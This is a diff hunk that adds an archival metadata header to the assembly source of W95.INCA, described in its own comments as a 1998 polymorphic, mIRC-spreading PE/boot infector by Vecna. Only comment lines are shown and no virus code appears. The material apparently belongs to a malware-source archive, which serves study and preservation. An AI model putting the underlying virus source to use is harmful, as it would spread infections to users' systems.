@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      Legacy Win95
+; type      asm
+; cve       —
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     —
+; ------------------------------------------------------------
 ;[W95.INCA] Multipartite PE/BOOT polymorphic mIRC spreading infector
 ;Copyright 1998 (c) Vecna
 ;
